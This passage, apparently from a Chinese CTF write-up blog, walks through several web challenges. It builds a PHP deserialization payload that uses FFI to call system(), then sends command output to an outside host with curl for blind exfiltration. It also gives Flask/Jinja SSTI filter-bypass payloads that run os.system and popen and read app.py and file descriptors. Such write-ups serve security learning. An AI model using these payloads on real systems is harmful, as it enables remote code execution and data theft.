<figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">array</span>(<span class="number">4</span>) &#123; [<span class="number">0</span>]=&gt; <span class="built_in">string</span>(<span class="number">1</span>) <span class="string">&quot;.&quot;</span> [<span class="number">1</span>]=&gt; <span class="built_in">string</span>(<span class="number">2</span>) <span class="string">&quot;..&quot;</span> [<span class="number">2</span>]=&gt; <span class="built_in">string</span>(<span class="number">9</span>) <span class="string">&quot;index.php&quot;</span> [<span class="number">3</span>]=&gt; <span class="built_in">string</span>(<span class="number">11</span>) <span class="string">&quot;preload.php&quot;</span> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>查看preload.php的内容:</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/<span class="string">?a</span>=show_source(<span class="string">&quot;/var/www/html/preload.php&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到如下代码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = [</span><br><span class="line">        <span class="string">&#x27;ret&#x27;</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&#x27;func&#x27;</span> =&gt; <span class="string">&#x27;print_r&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;arg&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;ret&#x27;</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;func&#x27;</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span>(<span class="params"></span>): <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        array_merge(<span class="keyword">$this</span>-&gt;data, <span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> (<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params"><span class="variable">$payload</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> (<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[<span class="variable">$key</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> (<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">Exception</span>(<span class="string">&#x27;No implemented&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">Exception</span>(<span class="string">&#x27;No implemented&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>里面定义了一个可以反序列化执行任意函数的类,利用下面的脚本生成一个序列化对象:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = [</span><br><span class="line">        <span class="string">&#x27;ret&#x27;</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&#x27;func&#x27;</span> =&gt; <span class="string">&#x27;print_r&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;arg&#x27;</span> =&gt; <span class="string">&#x27;666&#x27;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;ret&#x27;</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;func&#x27;</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span>(<span class="params"></span>): <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        array_merge(<span class="keyword">$this</span>-&gt;data, <span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> (<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params"><span class="variable">$payload</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> (<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[<span class="variable">$key</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> (<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$A</span> = <span class="keyword">new</span> A();</span><br><span class="line">var_dump(serialize(<span class="variable">$A</span>))</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string(<span class="number">76</span>) <span class="string">&quot;C:1:&quot;</span>A<span class="string">&quot;:63:&#123;a:3:&#123;s:3:&quot;</span>ret<span class="string">&quot;;N;s:4:&quot;</span><span class="keyword">func</span><span class="string">&quot;;s:7:&quot;</span>print_<span class="string">r&quot;;s:3:&quot;</span>arg<span class="string">&quot;;s:3:&quot;</span><span class="number">666</span><span class="string">&quot;;&#125;&#125;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>传参:</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?a=var<span class="constructor">_dump(<span class="params">unserialize</span>(%27C:1:<span class="string">&quot;A&quot;</span>:63:&#123;<span class="params">a</span>:3:&#123;<span class="params">s</span>:3:<span class="string">&quot;ret&quot;</span>;N;<span class="params">s</span>:4:<span class="string">&quot;func&quot;</span>;<span class="params">s</span>:7:<span class="string">&quot;print_r&quot;</span>;<span class="params">s</span>:3:<span class="string">&quot;arg&quot;</span>;<span class="params">s</span>:3:<span class="string">&quot;666&quot;</span>;&#125;&#125;%27)</span>-&gt;<span class="constructor">__get(<span class="string">&quot;ret&quot;</span>)</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>返回结果如下</p>
<blockquote>
<p>666bool(true)</p>
</blockquote>
<p>成功用函数print_r打印出666</p>
<p>该题我们利用FFI扩展</p>
<p>FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。<br>FFI的使用非常简单，只用声明和调用两步就可以，对于有C语言经验，但是不了解Zend引擎的程序员来说，这简直是打开了新世界的大门，可以快速地使用C类库进行原型试验。<br>php样例如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// create FFI object, loading libc and exporting function printf()</span></span><br><span class="line"><span class="variable">$ffi</span> = FFI::cdef(</span><br><span class="line">    <span class="string">&quot;int printf(const char *format, ...);&quot;</span>, <span class="comment">// this is a regular C declaration</span></span><br><span class="line">    <span class="string">&quot;libc.so.6&quot;</span>);</span><br><span class="line"><span class="comment">// call C&#x27;s printf()</span></span><br><span class="line"><span class="variable">$ffi</span>-&gt;printf(<span class="string">&quot;Hello %s!\n&quot;</span>, <span class="string">&quot;world&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以发现FFI，可以直接调用底层c的函数执行命令，我们搜索一下：<br>printf对应的申明：<br><a target="_blank" rel="noopener" href="https://skysec.top/images/2019-05-18-21-30-01.png"><img src="https://skysec.top/images/2019-05-18-21-30-01.png" alt="img"></a><br>那么搜索system对应的申明:<br><a target="_blank" rel="noopener" href="https://skysec.top/images/2019-05-18-21-29-41.png"><img src="https://skysec.top/images/2019-05-18-21-29-41.png" alt="img"></a></p>
<p>将官方样例改写：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ffi</span> = FFI::cdef(<span class="string">&quot;int system (const char* command);&quot;</span>);</span><br><span class="line"><span class="variable">$ffi</span>-&gt;system(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用序列化触发，构造序列化为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">➜ cat <span class="number">1.</span>php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = [</span><br><span class="line">        <span class="string">&#x27;ret&#x27;</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&#x27;func&#x27;</span> =&gt; <span class="string">&#x27;FFI::cdef&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;arg&#x27;</span> =&gt; <span class="string">&quot;int system (const char* command);&quot;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> (<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params"><span class="variable">$payload</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<p>得到序列化:</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">C</span>:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">96</span>:&#123;a:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;ret&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;FFI::cdef&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;arg&quot;</span>;s:<span class="number">33</span>:<span class="string">&quot;int system (const char* command);&quot;</span>;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>尝试执行命令:</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?a=$a=unserialize(&#x27;C:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">96</span>:&#123;a:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;ret&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;FFI::cdef&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;arg&quot;</span>;s:<span class="number">33</span>:<span class="string">&quot;int system (const char* command);&quot;</span>;&#125;&#125;&#x27;);var<span class="constructor">_dump($<span class="params">a</span>-&gt;<span class="params">ret</span>-&gt;<span class="params">system</span>(&#x27;<span class="params">ls</span>&#x27;)</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>直接执行命令只返回<code>int(1792)</code>等，于是考虑用盲打，为了防止特殊字符，我们使用了Base64：</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?a=$a=unserialize(&#x27;C:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">96</span>:&#123;a:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;ret&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;FFI::cdef&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;arg&quot;</span>;s:<span class="number">33</span>:<span class="string">&quot;int system (const char* command);&quot;</span>;&#125;&#125;&#x27;);var<span class="constructor">_dump($<span class="params">a</span>-&gt;<span class="params">ret</span>-&gt;<span class="params">system</span>(&#x27;<span class="params">curl</span> <span class="params">ip</span>:23333<span class="operator">/</span>`<span class="params">ls</span> <span class="operator">/</span> | <span class="params">base64</span>`&#x27;)</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>nc连接即可</p>
<h2 id="watevrCTF-2019-Supercalc"><a href="#watevrCTF-2019-Supercalc" class="headerlink" title="[watevrCTF-2019]Supercalc"></a>[watevrCTF-2019]Supercalc</h2><p>知识点：</p>
<ol>
<li>利用（#）注释符进行SSTI</li>
<li>session伪造</li>
</ol>
<p>一个类似计算机的功能，在输入框，尝试输入<code>1+1</code>：</p>
<p>返回数字2</p>
<p>输入：<code>&#123;&#123;7*7&#125;&#125;</code></p>
<p>页面回显You cant use ast.Set m8</p>
<p>输入： <code>1/0</code></p>
<p>页面报错</p>
<p><img src="http://img.npfs06.top/20210226230906.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>说明程序对报错应该没有做过滤，这里学到了新姿势，尝试输入<code>#(注释)</code>：<code>1/0#&#123;&#123;7*7&#125;&#125;</code>：</p>
<p>可以发现被正确解析了，我们读取下config文件，可以发现存在SECRET_KEY,考虑session伪造</p>
<p><img src="http://img.npfs06.top/20210226225850.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>将cookie解密下</p>
<p><img src="http://img.npfs06.top/20210226231307.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>可以发现是提交历史，那么接下去就可以伪造cookie了</p>
<p><img src="http://img.npfs06.top/20210226231507.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="http://img.npfs06.top/20210226230314.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="Black-Watch-入群题-Web2"><a href="#Black-Watch-入群题-Web2" class="headerlink" title="[Black Watch 入群题]Web2"></a>[Black Watch 入群题]Web2</h2><p>知识点：</p>
<ol>
<li>group by with rollup</li>
<li>mysql任意文件读取</li>
</ol>
<p>1、with rollup：<br>with rollup关键字会在所有记录的最后加上一条记录，该记录是上面所有记录的总和。<br>2、group_concat():<br>group by与group_concat()函数一起使用时，每个分组中指定字段值都显示出来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> mysql&gt; select sex,group_concat(name) from employee group by sex;   </span><br><span class="line">+------+------------------+    </span><br><span class="line">| sex  |group_concat(name)|    </span><br><span class="line">+------+------------------+    </span><br><span class="line">| 女   | 李四              |    </span><br><span class="line">| 男   | 张三,王五，Aric    |      </span><br><span class="line">+------+------------------+    </span><br><span class="line">2 rows in set (0.00 sec)  </span><br></pre></td></tr></table></figure>
<p>例1、普通的 GROUP BY 操作，可以按照部门和职位进行分组，计算每个部门，每个职位的工资平均值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select dep,pos,avg(sal) from employee group by dep,pos;  </span><br><span class="line">+------+------+-----------+  </span><br><span class="line">| dep  | pos  | avg(sal)  |  </span><br><span class="line">+------+------+-----------+  </span><br><span class="line">| 01   | 01   | 1500.0000 |  </span><br><span class="line">| 01   | 02   | 1950.0000 |  </span><br><span class="line">| 02   | 01   | 1500.0000 |  </span><br><span class="line">| 02   | 02   | 2450.0000 |  </span><br><span class="line">| 03   | 01   | 2500.0000 |  </span><br><span class="line">| 03   | 02   | 2550.0000 |  </span><br><span class="line">+------+------+-----------+  </span><br><span class="line">6 rows in set (0.02 sec)  </span><br></pre></td></tr></table></figure>
<p>例2、如果我们希望显示部门的平均值和全部雇员的平均值，普通的 GROUP BY 语句是不能实现的，需要另外执行一个查询操作，或者通过程序来计算。如果使用有 WITH ROLLUP 子句的 GROUP BY 语句，则可以轻松实现这个要求：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select dep,pos,avg(sal) from employee group by dep,pos with rollup;  </span><br><span class="line">+------+------+-----------+  </span><br><span class="line">| dep  | pos  | avg(sal)  |  </span><br><span class="line">+------+------+-----------+  </span><br><span class="line">| 01   | 01   | 1500.0000 |  </span><br><span class="line">| 01   | 02   | 1950.0000 |  </span><br><span class="line">| 01   | NULL | 1725.0000 |  </span><br><span class="line">| 02   | 01   | 1500.0000 |  </span><br><span class="line">| 02   | 02   | 2450.0000 |  </span><br><span class="line">| 02   | NULL | 2133.3333 |  </span><br><span class="line">| 03   | 01   | 2500.0000 |  </span><br><span class="line">| 03   | 02   | 2550.0000 |  </span><br><span class="line">| 03   | NULL | 2533.3333 |  </span><br><span class="line">| NULL | NULL | 2090.0000 |  </span><br><span class="line">+------+------+-----------+  </span><br><span class="line">10 rows in set (0.00 sec) </span><br></pre></td></tr></table></figure>


<h2 id="pasecactf-2019-flask-ssti"><a href="#pasecactf-2019-flask-ssti" class="headerlink" title="[pasecactf_2019]flask_ssti"></a>[pasecactf_2019]flask_ssti</h2><p>知识点：SSTI</p>
<p>很常规的SSTI过滤绕过题，fuzz下，过滤了<code>.</code> , <code>_</code> , <code>&#39;</code></p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">单引号用双引号替换</span></span><br><span class="line"><span class="xml">下划线用hex编码/5F替换</span></span><br><span class="line"><span class="xml">点号用\x2E替换</span></span><br><span class="line"><span class="xml">例：</span></span><br><span class="line"><span class="template-variable">&#123;&#123;<span class="name">&#x27;&#x27;.__class__.__mro__</span>[2]&#125;&#125;</span></span><br><span class="line"><span class="template-variable">&#123;&#123;()<span class="name">[&quot;\5F\5Fclass\5F\5F&quot;]</span>[&quot;\5F\5Fmore\5F\5F&quot;][2]&#125;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;()<span class="name">[&quot;__class__&quot;]</span>[&quot;__bases__&quot;][0][&quot;__subclasses__&quot;]()[80][&quot;load_module&quot;](<span class="name">&quot;os&quot;</span>)[&quot;system&quot;](<span class="name">&quot;ls&quot;</span>)&#125;&#125;</span></span><br><span class="line"><span class="xml">//用<span class="tag">&lt;<span class="name">class</span> &#x27;<span class="attr">_frozen_importlib.BuiltinImporter</span>&#x27;&gt;</span>这个去执行命令</span></span><br><span class="line"></span><br><span class="line"><span class="template-variable">&#123;&#123;()<span class="name">[&quot;__class__&quot;]</span>[&quot;__bases__&quot;][0][&quot;__subclasses__&quot;]()[91][&quot;get_data&quot;](<span class="name">0</span>, <span class="string">&quot;app.py&quot;</span>)&#125;&#125;</span></span><br><span class="line"><span class="xml">//用<span class="tag">&lt;<span class="name">class</span> &#x27;<span class="attr">_frozen_importlib_external.FileLoader</span>&#x27;&gt;</span>这个去读取文件</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>payload1:</p>
<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\x5F\x5Fclass\x5F\x5F&quot;</span>][<span class="string">&quot;\x5F\x5Fbases\x5F\x5F&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\x5F\x5Fsubclasses\x5F\x5F&quot;</span>]()[<span class="number">91</span>][<span class="string">&quot;get\x5Fdata&quot;</span>](<span class="number">0</span>, <span class="string">&quot;/proc/self/fd/3&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>payload2:</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//直接读app.py文件，然后根据文件中的算法逆推flag</span></span><br><span class="line">&#123;&#123;()<span class="selector-attr">[<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>]</span><span class="selector-attr">[<span class="string">&quot;\x5f\x5fmro\x5f\x5f&quot;</span>]</span><span class="selector-attr">[1]</span><span class="selector-attr">[<span class="string">&quot;\x5f\x5fsubclasses\x5f\x5f&quot;</span>]</span>()<span class="selector-attr">[127]</span><span class="selector-attr">[<span class="string">&quot;\x5f\x5finit\x5f\x5f&quot;</span>]</span><span class="selector-attr">[<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>]</span><span class="selector-attr">[<span class="string">&quot;popen&quot;</span>]</span>(&quot;cat%<span class="number">20</span>app\x2epy&quot;)<span class="selector-attr">[<span class="string">&quot;read&quot;</span>]</span>()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="NPUCTF2020-验证🐎"><a href="#NPUCTF2020-验证🐎" class="headerlink" title="[NPUCTF2020]验证🐎"></a>[NPUCTF2020]验证🐎</h2><p>知识点：</p>
<ol>
<li>JavaScript中的类型比较</li>
